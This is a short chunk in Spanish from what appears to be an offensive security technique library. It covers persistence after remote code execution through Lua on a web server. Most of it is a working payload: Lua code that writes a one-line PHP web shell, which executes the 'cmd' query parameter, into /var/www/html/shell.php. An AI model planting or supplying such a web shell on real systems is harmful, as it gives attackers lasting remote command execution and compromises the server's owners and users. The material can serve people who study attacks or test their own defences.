---
chunk_id: technique::web::lua-rce::webshell-persistence::001
domain: web
chunk_type: technique
---

### 3. Persistencia (Creación de Web Shell)

El atacante intenta escribir un script en una carpeta pública del servidor web para poder ejecutar comandos fácilmente desde el navegador más tarde.

**Payload:**

```lua
local s = [[<?php system($_GET['cmd']); ?>]]
local f = io.open("/var/www/html/shell.php", "w")
if f then
    f:write(s)
    f:close()
    print("Shell instalada")
end
```
